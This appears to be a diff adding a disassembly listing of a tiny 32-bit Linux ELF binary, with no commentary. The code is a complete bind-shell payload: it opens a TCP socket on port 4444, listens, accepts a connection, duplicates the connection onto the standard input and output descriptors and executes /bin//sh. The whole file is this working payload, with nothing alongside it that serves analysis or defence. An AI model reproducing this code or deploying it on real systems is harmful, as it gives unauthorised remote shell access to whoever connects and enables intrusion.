@@ -1,0 +1,80 @@
+00000000  7F45              jg 0x47
+00000002  4C                dec esp
+00000003  46                inc esi
+00000004  0101              add [ecx],eax
+00000006  0100              add [eax],eax
+00000008  0000              add [eax],al
+0000000A  0000              add [eax],al
+0000000C  0000              add [eax],al
+0000000E  0000              add [eax],al
+00000010  0200              add al,[eax]
+00000012  0300              add eax,[eax]
+00000014  0100              add [eax],eax
+00000016  0000              add [eax],al
+00000018  54                push esp
+00000019  80040834          add byte [eax+ecx],0x34
+0000001D  0000              add [eax],al
+0000001F  0000              add [eax],al
+00000021  0000              add [eax],al
+00000023  0000              add [eax],al
+00000025  0000              add [eax],al
+00000027  003400            add [eax+eax],dh
+0000002A  2000              and [eax],al
+0000002C  0100              add [eax],eax
+0000002E  0000              add [eax],al
+00000030  0000              add [eax],al
+00000032  0000              add [eax],al
+00000034  0100              add [eax],eax
+00000036  0000              add [eax],al
+00000038  0000              add [eax],al
+0000003A  0000              add [eax],al
+0000003C  008004080080      add [eax-0x7ffff7fc],al
+00000042  0408              add al,0x8
+00000044  A2000000F0        mov [0xf0000000],al
+00000049  0000              add [eax],al
+0000004B  0007              add [edi],al
+0000004D  0000              add [eax],al
+0000004F  0000              add [eax],al
+00000051  1000              adc [eax],al
+00000053  0031              add [ecx],dh
+00000055  DBF7              fcomi st7
+00000057  E353              jecxz 0xac
+00000059  43                inc ebx
+0000005A  53                push ebx
+0000005B  6A02              push byte +0x2
+0000005D  89E1              mov ecx,esp
+0000005F  B066              mov al,0x66
+00000061  CD80              int 0x80
+00000063  5B                pop ebx
+00000064  5E                pop esi
+00000065  52                push edx
+00000066  680200115C        push dword 0x5c110002
+0000006B  6A10              push byte +0x10
+0000006D  51                push ecx
+0000006E  50                push eax
+0000006F  89E1              mov ecx,esp
+00000071  6A66              push byte +0x66
+00000073  58                pop eax
+00000074  CD80              int 0x80
+00000076  894104            mov [ecx+0x4],eax
+00000079  B304              mov bl,0x4
+0000007B  B066              mov al,0x66
+0000007D  CD80              int 0x80
+0000007F  43                inc ebx
+00000080  B066              mov al,0x66
+00000082  CD80              int 0x80
+00000084  93                xchg eax,ebx
+00000085  59                pop ecx
+00000086  6A3F              push byte +0x3f
+00000088  58                pop eax
+00000089  CD80              int 0x80
+0000008B  49                dec ecx
+0000008C  79F8              jns 0x86
+0000008E  682F2F7368        push dword 0x68732f2f
+00000093  682F62696E        push dword 0x6e69622f
+00000098  89E3              mov ebx,esp
+0000009A  50                push eax
+0000009B  53                push ebx
+0000009C  89E1              mov ecx,esp
+0000009E  B00B              mov al,0xb
+000000A0  CD80              int 0x80
